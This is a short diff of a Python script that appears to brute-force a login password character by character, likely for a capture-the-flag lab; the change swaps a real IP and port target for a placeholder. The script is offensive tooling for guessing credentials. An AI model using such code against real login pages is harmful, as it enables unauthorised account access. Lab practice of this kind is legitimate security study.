@@ -14,7 +14,7 @@ digits  = list(string.digits)
 other = ["#","$","%","@","!","{","}","[","]","_","&","^"," "]
 attempts = lowercase+uppercase+digits+other
 username = '' # I will not give username ;-)
-host = 'http://206.189.121.131:30475/login' 
+host = 'http://machine_ip:port/login' 
 def bruteforce(found_letter=None):
     for i in attempts:
         if found_letter != None:
